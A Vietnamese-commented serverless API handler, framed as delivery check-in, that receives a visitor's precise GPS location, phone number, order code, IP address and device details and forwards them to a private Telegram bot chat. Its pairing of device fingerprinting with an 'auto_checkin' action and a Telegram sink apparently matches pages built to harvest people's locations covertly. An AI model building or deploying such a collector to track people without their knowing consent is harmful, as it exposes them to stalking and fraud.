export default async function handler(req, res) {
  // Chỉ chấp nhận POST request
  if (req.method !== 'POST') {
    return res.status(405).json({ 
      success: false, 
      error: 'Method not allowed' 
    });
  }

  const {
    lat,
    lng,
    accuracy,
    ip,
    phone,
    order,
    action,
    device,
    browser,
    platform,
    screen,
    signal,
    timestamp,
    mapsLink
  } = req.body;

  // Validate dữ liệu
  if (!lat || !lng) {
    return res.status(400).json({ 
      success: false, 
      error: 'Thiếu tọa độ GPS' 
    });
  }

  const safePhone = phone || 'Chưa nhập';
  const safeOrder = order || 'Chưa có';

  try {
    const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
    const CHAT_ID = process.env.CHAT_ID;

    if (TELEGRAM_TOKEN && CHAT_ID) {
      // Tạo tiêu đề action
      let actionEmoji = '📍';
      let actionTitle = 'CẬP NHẬT VỊ TRÍ';
      
      if (action === 'checkin' || action === 'auto_checkin') {
        actionEmoji = '✅';
        actionTitle = 'CHECK-IN GIAO HÀNG';
      } else if (action === 'share') {
        actionEmoji = '📤';
        actionTitle = 'SHARE VỊ TRÍ';
      }

      // Tạo tin nhắn chi tiết
      const text = `
${actionEmoji} <b>${actionTitle}</b>

<b>📞 Số điện thoại:</b> ${safePhone}
${safeOrder !== 'Chưa có' ? `<b>📦 Mã đơn hàng:</b> ${safeOrder}` : ''}
<b>📍 Tọa độ:</b> ${lat.toFixed(6)}, ${lng.toFixed(6)}
<b>🎯 Độ chính xác:</b> ±${accuracy ? accuracy.toFixed(0) : '?'} mét

<b>🌍 Thông tin kết nối:</b>
IP: ${ip || 'N/A'}
Mạng: ${signal || 'Unknown'}

<b>💻 Thông tin thiết bị:</b>
Thiết bị: ${device || 'Unknown'}
Trình duyệt: ${browser || 'Unknown'}
Hệ điều hành: ${platform || 'Unknown'}
Độ phân giải: ${screen || 'Unknown'}

<b>🕐 Thời gian:</b> ${new Date(timestamp).toLocaleString('vi-VN')}

<b>📌 Bản đồ:</b>
<a href="${mapsLink}">Xem trên Google Maps</a>
      `.trim();

      // Gửi tin nhắn Telegram
      const telegramResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: text,
          parse_mode: 'HTML',
          disable_web_page_preview: false
        })
      });

      const telegramData = await telegramResponse.json();

      if (!telegramData.ok) {
        console.error('Lỗi Telegram:', telegramData);
      }

      // Nếu có link maps, gửi thêm vị trí
      if (mapsLink) {
        try {
          await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendLocation`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: CHAT_ID,
              latitude: lat,
              longitude: lng,
              horizontal_accuracy: accuracy || 0
            })
          });
        } catch (error) {
          console.error('Lỗi gửi vị trí Telegram:', error);
        }
      }
    }

    // Log vào console
    console.log(`[${new Date().toISOString()}] ${action.toUpperCase()} - Phone: ${safePhone} - Order: ${safeOrder} - Location: ${lat}, ${lng}`);

    return res.status(200).json({
      success: true,
      message: `${action === 'checkin' || action === 'auto_checkin' ? 'Check-in' : 'Share'} thành công`,
      data: {
        lat,
        lng,
        accuracy,
        phone,
        order,
        action,
        timestamp
      }
    });

  } catch (error) {
    console.error('Lỗi server:', error);
    return res.status(500).json({
      success: false,
      error: 'Lỗi máy chủ: ' + error.message
    });
  }
}